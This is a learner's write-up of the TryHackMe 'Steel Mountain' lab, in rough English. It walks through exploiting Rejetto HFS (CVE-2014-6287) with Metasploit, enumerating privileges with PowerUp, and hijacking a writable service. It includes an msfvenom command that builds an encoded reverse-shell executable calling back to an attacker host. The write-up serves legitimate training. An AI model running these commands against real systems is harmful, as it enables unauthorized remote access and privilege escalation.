# THM-SteelMountain
I lerarn how haced the Windows machine. I use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and I learn a new technique to get Administrator access.
< THM Steel Mountain room

#Task1 Open website in adress 10.10.135.167 in Virtaul Machine. I open page source preview to see name employee of the month: Bill Harper

![This is an image](https://github.com/karolinaras/THM-SteelMountain/blob/dad0e029bde0c3497b42de1d77897a4d47ed3977/SteelMountain1.png)


#Task2 I scan maschin the command: `nmap -sV -sC 10.10.135.167` and I find running web serwer on 8080 port. And another serwer Rejetto HTTP File Server

![This is an image](https://github.com/karolinaras/THM-SteelMountain/blob/dad0e029bde0c3497b42de1d77897a4d47ed3977/SteelMountain2.png)


#Task3 I find in exploit-database exploit "Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)" with number `CVE-2014-6287`.

![This is an image](https://github.com/karolinaras/THM-SteelMountain/blob/dad0e029bde0c3497b42de1d77897a4d47ed3977/SteelMountain3.png)


#Task4 I Use Metasploit to get an initial shell.
Command: 
````
msfconsole
search CVE-2014-6287
use 0
options
set RHOST 10.10.135.167
set RPORT 8080
exploit
````

![This is an image](https://github.com/karolinaras/THM-SteelMountain/blob/dad0e029bde0c3497b42de1d77897a4d47ed3977/SteelMountain4.png)
![This is an image]https://github.com/karolinaras/THM-SteelMountain/blob/dad0e029bde0c3497b42de1d77897a4d47ed3977/SteelMountain5.png)

#Task5 Now I have access to system bill and I must find Desktop and user flag. I use many times command `cd ..` that  I been in directory 
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs and I want go to Desktop. 

![This is an image](https://github.com/karolinaras/THM-SteelMountain/blob/dad0e029bde0c3497b42de1d77897a4d47ed3977/SteelMountain6.png)

I find `user.txt` and on it flag.

![This is an image](https://github.com/karolinaras/THM-SteelMountain/blob/dad0e029bde0c3497b42de1d77897a4d47ed3977/SteelMountain7.png)

#Task6 To enumerate this machine, I will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and determine any abnormalities.
I have to copy code PowerUp from GitHub. I use command : git clone https://github.com/PowerShellMafia/PowerSploit.git and code is in my home page.

![This is an image](https://github.com/karolinaras/THM-SteelMountain/blob/fe641f35183ff4c3cb0a0e8184679a782874d5fd/SteelMountain9.png)

![This is an image](https://github.com/karolinaras/THM-SteelMountain/blob/ad14fc0ac5ef54e934cfea32fd555cd297ab6ccd/SteelMountain10.png)

![This is an image](https://github.com/karolinaras/THM-SteelMountain/blob/ad14fc0ac5ef54e934cfea32fd555cd297ab6ccd/SteelMountain11.png)


#Task7 Start power shell using 
command in the Meterpreter: 
``
powershell_shell
PowerUp.ps1
Invoke-AllChecks
``

![This is an image](https://github.com/karolinaras/THM-SteelMountain/blob/ad14fc0ac5ef54e934cfea32fd555cd297ab6ccd/SteelMountain12.png)


#Task8 I found to the CanRestart option that is set to true AdvancedSystemCareService9. 
The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!
 #Task9 Use msfvenom to generate a reverse shell as an Windows executable. I use command: `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.3.245 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe`
 
![This is an image](https://github.com/karolinaras/THM-SteelMountain/blob/ad14fc0ac5ef54e934cfea32fd555cd297ab6ccd/SteelMountain13.png)
